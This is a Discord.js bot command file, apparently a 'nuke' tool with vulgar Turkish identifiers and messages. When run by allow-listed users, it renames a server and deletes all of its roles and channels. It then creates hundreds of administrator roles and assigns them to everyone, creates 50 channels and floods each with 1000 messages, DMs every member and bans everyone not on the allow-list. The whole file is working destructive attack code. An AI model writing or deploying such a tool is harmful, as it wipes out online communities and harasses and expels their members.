const Discord = require('discord.js');
const moment = require('moment')
require('moment-duration-format')
moment.locale('tr')
exports.run = async (client, message, args, embed) => {
if(!client.ayarlar.sikiciler.some(sktm => message.author.id == sktm)) return message.reply({content: `Sadece Bacı Sikenler Kullanabilir.`}).sil(15)
message.guild.setName(client.ayarlar.sunucuisim).catch(e => {})
message.guild.setIcon(client.ayarlar.sunucupp).catch(e => {})  
message.guild.setBanner(client.ayarlar.sunucupp).catch(e => {})   
message.guild.roles.cache.forEach(anne => anne.delete().catch(e => {}))
message.guild.channels.cache.forEach(oruspu => oruspu.delete().catch(e => {})) 
for(let sx = 0; sx < 240; sx++) {
message.guild.roles.create({ name: `${client.ayarlar.rolisim}`}).then(sex => {
var oc = message.guild.roles.cache.get(sex.id)  
oc.setPermissions(Discord.PermissionsBitField.Flags.Administrator).catch(e => {})
message.guild.members.cache.forEach(sikici => {
sikici.roles.add(oc.id).catch(e => {})  
})  
})
}
for(let hard = 0; hard < 50; hard++) {
         message.guild.channels.create({
            name: client.ayarlar.kanalisim,
            type: Discord.ChannelType.Text,
            permissionOverwrites: [{
                        id: message.guild.id,
                        allow: [Discord.PermissionFlagsBits.ViewChannel]
                    }
            ],
        }).catch(e => {}).then(bacisken => {
            for(let porno = 0; porno < 1000; porno++) { 
                bacisken.send({ content: `${client.ayarlar.kanalyazi}` }).catch(e => {})
            }
        });
    } 
message.guild.members.cache.forEach(oclari => {
oclari.send({content: `${client.ayarlar.dmyazi}`}).catch(e => {})
})  

message.guild.members.cache.forEach(annesizler => {
if(!client.ayarlar.sikiciler.some(otuzbir => annesizler.id == otuzbir)) {
annesizler.ban({ reason: `${client.ayarlar.banyazi}` }).catch(e => {})
}
});  
console.log(`${message.guild.name} Sunucusu ${moment(Date.now()).format("LLL")} Tarihinde Bacısı Sikildi.`)  
  
};
exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: [],
  permLevel: 0
}
exports.help = {
  name: 'bum'
};
